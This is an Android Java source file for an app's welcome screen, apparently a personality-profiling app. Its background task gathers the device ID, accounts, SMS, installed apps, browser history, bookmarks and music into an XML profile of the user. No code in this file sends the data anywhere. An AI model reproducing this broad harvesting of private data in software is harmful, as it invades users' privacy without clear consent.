package com.airwhip.sphinx;

import android.app.Activity;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.view.animation.Animation;
import android.widget.ImageButton;
import android.widget.ImageView;
import android.widget.TextView;

import com.airwhip.sphinx.anim.Fade;
import com.airwhip.sphinx.anim.Move;
import com.airwhip.sphinx.anim.Spin;
import com.airwhip.sphinx.getters.AccountInformation;
import com.airwhip.sphinx.getters.ApplicationInformation;
import com.airwhip.sphinx.getters.BrowserInformation;
import com.airwhip.sphinx.getters.MusicInformation;
import com.airwhip.sphinx.getters.SMSInformation;
import com.airwhip.sphinx.misc.Constants;
import com.airwhip.sphinx.misc.Internet;
import com.airwhip.sphinx.misc.Names;
import com.airwhip.sphinx.parser.Characteristic;
import com.airwhip.sphinx.parser.InformationParser;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

import java.util.ArrayList;
import java.util.List;

public class WelcomeActivity extends Activity {

    private static Names names;

    private ImageButton circle;
    private TextView startText;
    private TextView tipText;
    private ImageView plugImage;
    private ImageView socketImage;

    public static boolean isContainsName(String name) {
        return names.contains(name);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_welcome);

        circle = (ImageButton) findViewById(R.id.circle);
        startText = (TextView) findViewById(R.id.startText);
        tipText = (TextView) findViewById(R.id.tipText);

        plugImage = (ImageView) findViewById(R.id.plugImage);
        socketImage = (ImageView) findViewById(R.id.socketImage);

        circle.setOnClickListener(new StartButtonClick(ProgramState.START));

        names = new Names(this);
    }

    private enum ProgramState {
        START,
        NO_INTERNET
    }

    private class StartButtonAnimation implements Animation.AnimationListener {

        private ProgramState state;

        public StartButtonAnimation(ProgramState state) {
            this.state = state;
        }

        @Override
        public void onAnimationStart(Animation animation) {
        }

        @Override
        public void onAnimationEnd(Animation animation) {
            switch (state) {
                case START:
                    circle.setOnClickListener(null);
                    new ImageLoader().execute();
                    break;
                case NO_INTERNET:
                    plugImage.setAlpha(1f);
                    socketImage.setAlpha(1f);
                    findViewById(R.id.noInternetText).setAlpha(1f);
                    tipText.setText(getString(R.string.check_internet));
                    tipText.setAlpha(1f);
                    circle.setOnClickListener(new StartButtonClick(ProgramState.NO_INTERNET));
                    break;
            }
        }

        @Override
        public void onAnimationRepeat(Animation animation) {
        }
    }

    private class StartButtonClick implements View.OnClickListener {

        private ProgramState state;

        public StartButtonClick(ProgramState state) {
            this.state = state;
        }

        @Override
        public void onClick(View v) {
            Animation fadeOut = new Fade(startText, 0f);
            switch (state) {
                case START:
                    if (Internet.checkInternetConnection(getApplicationContext())) {
                        fadeOut.setAnimationListener(new StartButtonAnimation(ProgramState.START));
                        startText.startAnimation(fadeOut);
                    } else {
                        fadeOut.setAnimationListener(new StartButtonAnimation(ProgramState.NO_INTERNET));
                        startText.startAnimation(fadeOut);
                    }
                    tipText.setAlpha(0);
                    break;
                case NO_INTERNET:
                    if (Internet.checkInternetConnection(getApplicationContext())) {
                        plugImage.startAnimation(new Fade(plugImage, 0f));
                        socketImage.startAnimation(new Fade(socketImage, 0f));
                        findViewById(R.id.noInternetText).startAnimation(new Fade(findViewById(R.id.noInternetText), 0f));
                        tipText.startAnimation(new Fade(tipText, 0f));
                        fadeOut.setAnimationListener(new StartButtonAnimation(ProgramState.START));
                        circle.startAnimation(fadeOut);
                    } else {
                        plugImage.startAnimation(new Move(-17, 17, false));
                        socketImage.startAnimation(new Move(17, -17, false));
                    }
            }

        }
    }

    private class ImageLoader extends AsyncTask<Void, Integer, Void> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            circle.setImageResource(R.drawable.loading_circle);
            circle.startAnimation(new Spin());
        }

        @Override
        protected Void doInBackground(Void... params) {
            publishProgress(0);
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    Animation fadeIn = new Fade(startText, 1);
                    fadeIn.setDuration(200);
                    startText.startAnimation(fadeIn);
                }
            });

            StringBuilder partOfXml = new StringBuilder("<?xml version=\"1.0\" encoding=\"utf-8\"?>\n");
            partOfXml.append("<user id=\"" + Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID) + "\">\n");
            Characteristic.append(partOfXml);
            partOfXml = AccountInformation.get(getApplicationContext());
            SMSInformation.get(getApplicationContext());
            InformationParser parser = new InformationParser(getApplicationContext(), partOfXml, InformationParser.ParserType.ACCOUNT);
            Characteristic.addAll(parser.getAllWeight(), parser.getAllMax());
            Characteristic.append(partOfXml);
            publishProgress(20);
            partOfXml = ApplicationInformation.get(getApplicationContext());
            parser = new InformationParser(getApplicationContext(), partOfXml, InformationParser.ParserType.APPLICATION);
            Characteristic.addAll(parser.getAllWeight(), parser.getAllMax());
            Characteristic.append(partOfXml);
            publishProgress(40);
            partOfXml = BrowserInformation.getHistory(getApplicationContext());
            parser = new InformationParser(getApplicationContext(), partOfXml, InformationParser.ParserType.HISTORY);
            Characteristic.addAll(parser.getAllWeight(), parser.getAllMax());
            Characteristic.append(partOfXml);
            publishProgress(60);
            partOfXml = BrowserInformation.getBookmarks(getApplicationContext());
            parser = new InformationParser(getApplicationContext(), partOfXml, InformationParser.ParserType.BOOKMARKS);
            Characteristic.addAll(parser.getAllWeight(), parser.getAllMax());
            Characteristic.append(partOfXml);
            publishProgress(80);
            partOfXml = MusicInformation.get(getApplicationContext());
            parser = new InformationParser(getApplicationContext(), partOfXml, InformationParser.ParserType.MUSIC);
            Characteristic.addAll(parser.getAllWeight(), parser.getAllMax());
            Characteristic.append(partOfXml);
            publishProgress(100);
            Characteristic.append(new StringBuilder("</user>"));

            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            Intent intent = new Intent(getApplicationContext(), ResultActivity.class);
            startActivity(intent);
            finish();
        }

        @Override
        protected void onProgressUpdate(Integer... values) {
            super.onProgressUpdate(values);
            int progress = values[0];
            startText.setText(String.valueOf(progress) + "%");
        }
    }
}